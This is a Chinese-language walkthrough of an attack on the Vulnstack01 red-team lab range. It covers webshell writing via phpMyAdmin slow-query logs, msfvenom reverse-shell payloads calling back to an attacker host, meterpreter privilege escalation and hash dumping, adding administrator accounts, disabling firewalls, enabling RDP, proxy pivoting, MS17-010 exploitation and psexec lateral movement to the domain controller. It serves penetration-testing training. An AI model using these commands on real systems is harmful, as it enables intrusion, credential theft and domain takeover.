

# ATT&CK 红队评估 (Vulnstack01) 靶场渗透 - 先知社区

ATT&CK 红队评估 (Vulnstack01) 靶场渗透

- - -

## 环境配置：

这里正好学习一下内网环境的一个架构：靶场设置了三个虚拟机：

[![](assets/1701827767-9bad70ad31d67d0547334ea3b10bdffc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202190938-48a02126-9103-1.png)

这里 Win7 就是我们的 Web 服务器，我们需要模拟一个公网环境和我们的攻击机在一个网段下，同时我们还要配置一个内网环境，让攻击机无法直接去访问到内网的 Win2K3 和 Win2008，所以这里 Win7 我们配置一个双网卡，一个网卡使用 NAT 模式模拟我们的公网环境，另一个网卡设为 VMnet1(仅主机模式)，同时另外两个 Win2K3 和 Win2008 都设置为 VMnet1，从而落到同一个网段下构成一个内网环境。

我们可以看到我们的 NAT 模式将我们的公网段落到了 82 段上，然后内网段在 52 段上，在 Win7 上面，我们的本机/攻击机以及两个内网机都能够 ping 通 IP，但是因为 Win7 开了防火墙，过滤了 icmp 协议，所以其他机器无法 ping 通 Win7

[![](assets/1701827767-800e614bf261d862d13b7700f8bf7db0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202190910-37c252b6-9103-1.png)

## 启动服务：

然后我们需要启动 Win7 上面的 phpstudy 服务来构造起我们的 Web 服务，但是这里红日靶场的 phpstudy 不能够启动，我们就手动启动 Apache 服务和 Mysql 服务，这里覆盖上命令：

**启动 Apache 服务：**

```plain
httpd.exe -k install

httpd.exe -k -n apache2.4
```

然后启动 services.msc 打开对应 MySQL 服务：

[![](assets/1701827767-e85b3d02814583cd07704c280a8db2cc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202190951-50794896-9103-1.png)

**启动 mysql 服务：**

```plain
mysqld --install

mysqld --defaults-file="C:/phpStudy/mysql/my.ini" --console --skip-grant-tables
```

[![](assets/1701827767-dc7f083c8c608484152a8a962aaae634.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202191046-710e6cee-9103-1.png)

## 外网打点：

### 漏洞一：yxcms 弱口令登录，插件模板写马

### 漏洞二：phpMyAdmin 慢查询写马

```plain
show variables like '%slow%';
set GLOBAL slow_query_log_file='C:/phpStudy/WWW/shell.php';
set GLOBAL slow_query_log=on;
set GLOBAL log_queries_not_using_indexes=on;
```

[![](assets/1701827767-76bc66dc2ae88212cb1d8dea489cdad4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202191101-7a4f48e6-9103-1.png)

## 内网上线 (143 机器)：

### CS 文件马上线：

通过 CS 制作 exe 文件木马上传蚁剑然后运行上线 CS

systeminfo 查看补丁信息：

[![](assets/1701827767-957145b47c7aea3eef2008f3492feeae.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202191219-a85623e0-9103-1.png)

利用 ms14\_058 提权成功

### powershell 上线：

通过制作 powershell 来上线：

[![](assets/1701827767-6c5e93b33fcdbb2dfe3d466714dbe22b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202191228-ae005d38-9103-1.png)

### MSF 上线：

#### msf 生成木马：

```plain
Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=< Your IP Address> LPORT=< Your Port to Connect On> -f elf > shell.elf

Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe > shell.exe

Mac
msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho > shell.machoWeb Payloads

PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT= -f raw > shell.php

ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp > shell.asp

JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw > shell.jsp

WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > shell.war

Python
msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw > shell.py

Bash
msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw > shell.sh

Perl
msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw > shell.pl
```

#### 反向 shell：

```plain
msfconsole
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.254.129 LPORT=7777 -f exe -o shell.exe
# 反向 shell
```

#### 开启 msf 监听：

```plain
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.53.131
set lport 8885
run
```

[![](assets/1701827767-937647948ca740a837bd2ec1627dbb14.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202191241-b5f08a5e-9103-1.png)

提权：

```plain
meterpreter > getuid
Server username: GOD\Administrator

meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

[![](assets/1701827767-8d2ec22c22542ac477ff82da36f5af74.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202191249-ba42c392-9103-1.png)

关闭防火墙

```plain
meterpreter >  run post/windows/manage/enable_rdp
```

[![](assets/1701827767-769d05bf4fd346c15731147532a0bfb8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231205085031-4a4c6d66-9308-1.png)

```plain
1. sessions -i
2. #查看已经获取的会话
3. sessions -i 1
4. #连接到指定序号的 meterpreter 会话已继续利用
```

[![](assets/1701827767-7c3cac263078b7374382892b027b8077.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202191306-c4659dfe-9103-1.png)

## 信息搜集：

### 基础信息搜集：

如遇 shell 乱码问题可输入`chcp 65001`缓解部分问题

```plain
输入 ashelp 查看本地命令
net user 查看本地账户
whoami 当前用户权限
ipconfig -all Windows IP 配置
systeminfo  #信息
tasklist #查询进程及服务
ipconfig /all #.域信息
netstat -an #查看端口状态
net view
net view /domain #查看当前登录域与用户信息
```

### 添加用户：

```plain
net user srn7 P@ssword /add
# 添加用户
net localgroup administrators srn7 /add
# 将用户添加至管理员组
net user srn7
```

[![](assets/1701827767-533b3c24dc77a11bc60566ec4af2d646.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202191335-d613f780-9103-1.png)

[![](assets/1701827767-0a80a23d22ba0b53196e67a73f966106.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202191330-d2f95162-9103-1.png)

### 开启远程 3389 端口：

```plain
netstat -an 查看端口状态
```

```plain
wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !="") call setallowtsconnections 1
wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName='RDP-Tcp') call setuserauthenticationrequired 1

'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'
```

```plain
开启 3389 服务：

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp" /v PortNumber /t REG_DWORD /d 3389 /f

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 3389 /f

net start termservice
```

[![](assets/1701827767-f9d93ae7e10004753a1abe97b1484172.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202191350-deb47f90-9103-1.png)

查看注册表值来确定是否开启远程桌面服务：

```plain
REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
```

### 关闭防火墙：

```plain
关闭防火墙
netsh advfirewall set allprofiles state off
关闭防火墙
netsh firewall set opmode disable               #winsows server 2003 之前
netsh advfirewall set allprofiles state off     #winsows server 2003 之后
防火墙放行 3389
netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
```

[![](assets/1701827767-f91dabe920f3cb9184b0b1b9254150c5.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202191401-e5687e0e-9103-1.png)

### 查看域信息：

```plain
net group /domain  #查看域内所有用户列表
net group "domain computers" /domain #查看域成员计算机列表
net group "domain admins" /domain #查看域管理员用户
```

### 补丁信息：

```plain
run post/windows/gather/enum_patches
```

[![](assets/1701827767-8673bfdab0f19e3c2b73c4d4f667b239.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202191413-ecb6c080-9103-1.png)

### 查看安装软件：

```plain
run post/windows/gather/enum_applications
```

[![](assets/1701827767-57578615ca6e42bd3e8ef767c98aa33d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202191507-0cb4f366-9104-1.png)

### 获取密码：

#### 通过 mimikatz 获取用户名密码

#### 通过 msf 获取密码：

获取自动登录密码：

```plain
meterpreter > run windows/gather/credentials/windows_autologin
[] Running against STU1 on session 2 
[] The Host STU1 is not configured to have AutoLogon password
#在会话 2 上针对 STU1 运行 #主机 STU1 未配置为具有自动登录密码
```

[![](assets/1701827767-d4d14da12062335e5f2665b27041cd7f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202191522-15aff22c-9104-1.png)

查询 hashdump：

```plain
run post/windows/gather/smart_hashdump
```

[![](assets/1701827767-573900ad4a84bac2d2786642415f73f9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231205085347-bfa4cd6a-9308-1.png)

```plain
[] 针对 STU1 运行模块
[] 如果连接，哈希值将保存到数据库中。
[+] 哈希值将以 JtR 密码文件格式保存在战利品中： 
[] /root/.msf4/loot/20211105144910_default_192.168.254.130_windows.hashes_151319.txt
[] 倾销密码哈希... 
[] 以 SYSTEM 身份运行，从注册表中提取哈希值
[] 获取启动密钥... 
[] 使用 SYSKEY fd4639f4e27c79683ae9fee56b44393f 计算 hboot 密钥...
[] 获取用户列表和密钥... 
[] 解密用户密钥...
[] 转储密码提示...
[] 在这个系统上没有有密码提示的用户
[] 倾销密码哈希... 
[+] 管理员：500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 
[+] liukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 
[+] srn7:1001:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::
```

```plain
密码格式
用户名称：RID:LM-HASH 值:NT-HASH 值
rid 是 windows 系统账户对应固定的值，类似于 linux 的 uid，gid 号，500 为 administrator，501 为 guest 等
LM-Hash 和 NT-Hash，这是对同一个密码的两种不同的加密方式，可采用 MD5 解密；
```

## 远程桌面连接：

[![](assets/1701827767-48a029a9b3551d01a7deef89e3b62a99.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202191537-1ea2cba2-9104-1.png)

解决方法：

[![](assets/1701827767-c173260c92a4efb94c288245606b4668.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202191551-2739f434-9104-1.png)

[![](assets/1701827767-7f98038857bfaa7579b8e335f6898198.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202191557-2a94fec6-9104-1.png)

[![](assets/1701827767-7893d8e083df178f9c2962120ed51b0d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202191637-42af1b4a-9104-1.png)

## 内网穿透配置代理：

### 内网信息搜集：

```plain
ipconfig /all    查询本机 IP 段，所在域等
net config Workstation    当前计算机名，全名，用户名，系统版本，工作站域，登陆域
net user    本机用户列表
net localgroup administrators    本机管理员[通常含有域用户]
net view 查看域信息
net view /domain 查询主域信息
net config workstation 当前的登录域与用户信息
net time /domain 判断主域
nslookup god.org  nslookup 命令直接解析域名服务器
net user /domain 当前域的所有用户
route print  路由信息
net group "domain admins" /domain 域管理员的名字
```

### Frp 内网穿透：

```plain
1、后台运行 frp 服务 (定位至 frp 文件夹)
服务端：nohup ./frps -c frps.ini >/dev/null 2>&1 &
客户端：nohup ./frpc -c frpc.ini >/dev/null 2>&1 &

2、找到 frp 进程号
ps -aux|grep frp| grep -v grep

3、结束 frp 进程
kill -9 12345(找到的进程号)
tasklist
taskkill /F /PID 3604
```

在 kali 攻击机上部署 frps 服务端：

[![](assets/1701827767-f1746b1c3bab6f9690cdc15e02e57880.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231205084301-3e7917b0-9307-1.png)

在目标机上运行 frpc.exe 文件进行客户端连接：

[![](assets/1701827767-bb47a8dc11230fff0d458662ba3db81c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202191716-595bd964-9104-1.png)

配置全局代理：

[![](assets/1701827767-762874f20e9c07096b86cd053a1caab5.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202191723-5da4a30c-9104-1.png)

### MSF 路由转发穿透：

我们先来讲一下 msf 建立内网路由的原理：

```plain
这里需要注意，sock 协议不支持 ping 命令（icmp）
sock4a:TELNET,FTP,HTTP 等 TCP 协议;
sock5:TCP 与 UDP，并支持安全认证方案;
```

在我们使用 msf 来探测各个网段的主机信息时，我们需要先添加通过各个网段的路由，这样 msf 才能够知道应该怎么走，就好比我们提前告诉 msf 都有那些路可以走，然后他才能够去走。所以这里我们最先要做的就是对 msf 添加自动路由，或者手动指定路由添加：

```plain
#新建路由：
run post/multi/manage/autoroute

#查看路由信息
run autoroute -p

#添加指定路由，1 是接收的 session 编号
msf6 > route add 192.168.10.0 255.255.255.0 1

#查看路由表信息
route
```

这样我们添加路由以后，用 msf 自带的模块对内网主机进行扫描探测，msf 就会自动将流量送往对应的网段，但是如果我们不单单使用 msf 来进行渗透，我们就需要做代理转发，通过配置 socks 代理来帮我们获取到对应的内网信息

#### 添加 socks 代理：

我们在 vps 上面开启一个 Socks 代理，监听 vps 本地的 1080 端口，然后再通过这个端口将流量转给 msf，msf 又添加了路由，所以能够将流量直接带入到内网。其实就是这样的一个关系：

[![](assets/1701827767-fbc418352464ee630f5c9328af6019b5.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202191837-89eb0690-9104-1.png)

```plain
use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1  #或者默认 0.0.0.0
msf6 auxiliary(server/socks_proxy) > run
```

[![](assets/1701827767-aab470585d78ce5a5f7066e17813823e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202191844-8e38dec0-9104-1.png)

攻击机 kali 配置客户端代理：

```plain
vim /etc/proxychains4.conf
proxychains4 命令
```

[![](assets/1701827767-3f3cafacdde01650c8d106b7e00965bd.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202191851-92527dfe-9104-1.png)

## 内网漫游：

### arp 探测内网存活主机

```plain
use post/windows/gather/arp_scanner
set RHOSTS 192.168.52.0/24
set SESSION 1
run
```

[![](assets/1701827767-d05b036186d38cbeaef771b5cf149cbc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202191909-9d031ed4-9104-1.png)

### udp 协议发现内网存活主机

```plain
use auxiliary/scanner/discovery/udp_sweep
set RHOSTS 192.168.52.0/24
run
```

[![](assets/1701827767-855d00022f987aa5f35b51f12a50c466.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202191931-aa48de6c-9104-1.png)

### Nmap 主机端口探测：

查看域信息：net view

查看主域信息：net view /domain

开始横向渗透控制其它主机

进行其它内网主机端口探测

```plain
proxychains nmap -sS -sV -Pn 192.168.52.141
```

[![](assets/1701827767-326ab3bcce1688f9f9ab84d975dc2d20.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202192103-e0dad2fa-9104-1.png)

### fscan 扫描：

```plain
192.168.52.141:139 open
192.168.52.143:3306 open
192.168.52.141:135 open
192.168.52.1:445 open
192.168.52.1:139 open
192.168.52.1:135 open
192.168.52.138:445 open
192.168.52.143:445 open
192.168.52.138:139 open
192.168.52.138:135 open
192.168.52.143:139 open
192.168.52.138:88 open
192.168.52.143:135 open
192.168.52.138:80 open
192.168.52.141:21 open
192.168.52.143:80 open
192.168.52.141:445 open
192.168.52.141:7001 open
192.168.52.141:8099 open
192.168.52.141:8098 open
192.168.52.141:7002 open
[+] 192.168.52.143  MS17-010    (Windows 7 Professional 7601 Service Pack 1)
[*] NetInfo:
[*]192.168.52.138
   [->]owa
   [->]192.168.52.138
[*] NetInfo:
[*]192.168.52.143
   [->]stu1
   [->]192.168.52.143
   [->]169.254.129.186
   [->]192.168.82.7
[+] 192.168.52.138  MS17-010    (Windows Server 2008 R2 Datacenter 7601 Service Pack 1)
[*] NetBios: 192.168.52.138  [+]DC owa.god.org                   Windows Server 2008 R2 Datacenter 7601 Service Pack 1
[*] NetInfo:
[*]192.168.52.141
   [->]root-tvi862ubeh
   [->]192.168.52.141
[+] 192.168.52.141  MS17-010    (Windows Server 2003 3790)
[*] WebTitle: http://192.168.52.141:7002 code:200 len:2632   title:Sentinel Keys License Monitor
[*] WebTitle: http://192.168.52.143     code:200 len:14749  title:phpStudy 探针 2014
[+] ftp://192.168.52.141:21:anonymous 
[*] WebTitle: http://192.168.52.138     code:200 len:689    title:IIS7
```

### FTP 弱口令连接 (141 机器)：

```plain
proxychains ftp
ftp> open 192.168.52.141 21
Name (192.168.52.141:root): anonymous
Password:
ftp> help
```

[![](assets/1701827767-a75b8f830108e89709d2f42d9e036fea.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202192219-0e0a9562-9105-1.png)

### MS17-010 永恒之蓝 (141 机器)：

fscan 和 nmap 扫描发现开放 445 端口：永恒之蓝漏洞通过 TCP 的 445 和 139 端口，来利用 v1 和 NBT 中的远程代码执行漏洞，通过恶意代码扫描并攻击开放 445 文件共享端口的 Windows 主机。只要用户主机开机联网，即可通过该漏洞控制用户的主机。

```plain
use auxiliary/admin/smb/ms17_010_command
set COMMAND net user
set RHOST 192.168.52.141
exploit
```

添加用户名：

```plain
set COMMAND net user hack hack /add
添加不成功，因为有密码设置策略，密码不能太简单且不能包含用户名
set COMMAND net user hack qaz@123
添加成功
```

[![](assets/1701827767-888a7c6f9f72521d96db91dc9aecb284.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202192316-3058e29a-9105-1.png)

[![](assets/1701827767-f17b1774f033b25c21447bf63ac40ea5.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202192326-366181e2-9105-1.png)

正向连接（未成功）：

```plain
利用 exploit/windows/smb/ms17_010_psexec 尝试正向连接

search ms17-010
use exploit/windows/smb/ms17_010_psexec
show options
set rhosts 192.168.52.141
set payload
set lhost 192.168.82.3
set lport 7777
set SMBuser srn7
set SMBpass P@ssword
exploit
```

开启 3389 端口：

```plain
search ms17-010
use auxiliary/admin/smb/ms17_010_command
show options
set rhosts 192.168.52.141
set COMMAND wmic path win32_terminalservicesetting where (__CLASS !="") call setallowtsconnections 1
exploit
```

上面这个没有开启成功，下面这个成功了

```plain
search ms17-010
use auxiliary/admin/smb/ms17_010_command
show options
set rhosts 192.168.52.141
set command 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'
run
```

远程连接：直接在 msf 里 rdesktop 192.168.52.141 或者另起终端 proxychains rdesktop 192.168.52.141 或者全局代理直接本机远程连接均可；

[![](assets/1701827767-eb33cb7119def0e32500d93c563b251b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202192348-435d3a44-9105-1.png)

### telnet 远程连接服务 (141 机器)：

Telnet（"Telecommunication Network" 的缩写）是一种用于在计算机之间进行远程终端连接的协议。Telnet 服务允许用户通过网络远程登录到远程主机，并在远程主机上执行命令，就像直接在本地计算机上执行一样。Telnet 是一个简单的文本协议，主要用于远程管理和调试。

开启 23 端口并打开 telnet 服务：

```plain
set COMMAND sc config tlntsvr start= auto
set COMMAND net start telnet
```

接下来 telnet 连接

```plain
use auxiliary/scanner/telnet/telnet_login
set RHOSTS 192.168.52.141
set username hack
set PASSWORD qaz@123
exploit
```

自行连接：

```plain
telnet 192.168.52.141
```

[![](assets/1701827767-bc8159be78b492db12001b2d7ef2e3aa.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202193055-41aa9b50-9106-1.png)

## CS 横向渗透 (138 机器)：

net view 首先查看域内信息：

[![](assets/1701827767-c97864747f506142b422ec36ac572689.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202193112-4be78434-9106-1.png)

当我们拿到一个机器的 beacon 以后，通过 mimikatz 抓取明文密码，得到其他机器和本机机器的某些用户的明文密码，这里我们通过 143 机器 administrator 的密码以后，因为 143 机器开启了 445 端口，所以我们就可以通过这个机器的 445 端口和目标不出网的 138 机器的 445 端口进行 smb 通讯

这里我们使用 smb 的监听器：

[![](assets/1701827767-fea33339f6b3556a4b77a7f4e96ab822.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202193138-5b7c67de-9106-1.png)

然后通过 psexec 进行内网横向渗透，通过 143 机器对 138 机器进行通讯：

[![](assets/1701827767-4c68324183b22191dfc5023cac299c06.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231205084812-f7ac2880-9307-1.png)

然后我们发现 138 机器 OWA 成功上线，拿下域控：

[![](assets/1701827767-2aff0dbc898f79f9d49e683ffbaa3a9f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231202193152-6380a832-9106-1.png)

参考文章：  
[https://blog.csdn.net/qq\_40638006/article/details/122033546](https://blog.csdn.net/qq_40638006/article/details/122033546)  
[https://www.freebuf.com/articles/web/324441.html](https://www.freebuf.com/articles/web/324441.html)
